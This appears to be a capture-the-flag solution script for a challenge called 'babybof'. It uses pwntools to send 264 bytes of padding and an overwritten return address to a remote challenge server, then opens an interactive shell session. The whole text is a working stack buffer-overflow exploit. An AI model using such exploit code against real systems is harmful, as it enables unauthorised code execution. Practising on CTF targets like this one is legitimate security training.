#babybof
from pwn import *
#conn = process ('./babybof')
conn=remote("chals20.cybercastors.com",14425)
buf="a"*264
payload=p64(0x004006e7)
out=buf+payload
conn.sendline(out)
conn.interactive()
